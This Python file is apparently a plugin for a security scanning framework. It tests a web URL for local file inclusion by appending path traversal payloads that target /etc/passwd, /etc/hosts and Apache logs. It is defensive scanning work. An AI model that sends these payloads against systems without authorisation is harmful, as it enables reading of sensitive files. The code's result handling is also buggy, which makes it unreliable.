import json
import requests
import sys
from urllib.parse import quote
from typing import List, Tuple, Union
from boefjes.job_models import BoefjeMeta


def lfi_scanner(url: List[str]) -> dict:
    """Checks a webserver path for lfi"""
    payloads = [
            "/etc/passwd", 
            "../etc/passwd", 
            "../../etc/passwd", 
            "/etc/hosts", 
            "../etc/hosts", 
            "../../etc/hosts", 
            "/var/log/apache2/access.log",
            "../var/log/apache2/access.log",
            "/test.txt",
            "../vulnerable_app.py",
            "../../var/log/apache2/access.log",
            # Add more payloads here...
        ]

    # Iterate over the payloads
    for payload in payloads:
        try:
            # Send a GET request to the URL with the payload
            response = requests.get(url + quote(payload))
            # If the response code is 200, then the site may be vulnerable
            if response.status_code == 200:
                # Append the payload and response to the vulnerabilities list
                result = {'url': url, 'vulnerabilities': []}
                result['vulnerabilities'].append({'payload': payload, 'response': response.text})
        except Exception as e:
            # If there's an error (like a network error), skip this payload
            pass
    return result

def run(boefje_meta: BoefjeMeta) -> List[Tuple[set, Union[bytes, str]]]:
    """return results to normalizer."""
    input_ = boefje_meta.arguments["input"]
    hostname = input_["netloc"]["name"]
    path = input_["path"]
    scheme = input_["scheme"]
    url = f"{scheme}://{hostname}{path}"
    results = lfi_scanner(url)
    return [(set(), json.dumps(results))]




